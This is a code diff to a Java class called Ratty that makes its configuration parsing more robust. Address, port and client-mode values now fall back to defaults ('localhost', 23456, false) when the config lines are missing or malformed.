@@ -50,13 +50,34 @@ public final class Ratty {
 		
 		final String text = new String(data);
 		final String[] lines = text.split("\r\n");
-		final String addressString = lines[0];
-		final String portString = lines[1];
-		final String clientString = lines[2];
 		
-		ADDRESS = addressString;
-		PORT = Integer.parseInt(portString);
-		CLIENT = Boolean.parseBoolean(clientString);
+		String address;
+		int port;
+		boolean client;
+		
+		try {
+			address = lines[0];
+		} catch (final Exception ex) {
+			address = "localhost";
+		}
+		
+		try {
+			final String portString = lines[1];
+			port = Integer.parseInt(portString);
+		} catch (final Exception ex) {
+			port = 23456;
+		}
+		
+		try {
+			final String clientString = lines[2];
+			client = Boolean.parseBoolean(clientString);
+		} catch (final Exception ex) {
+			client = false;
+		}
+		
+		ADDRESS = address;
+		PORT = port;
+		CLIENT = client;
 	}
 	
 	private Ratty() {
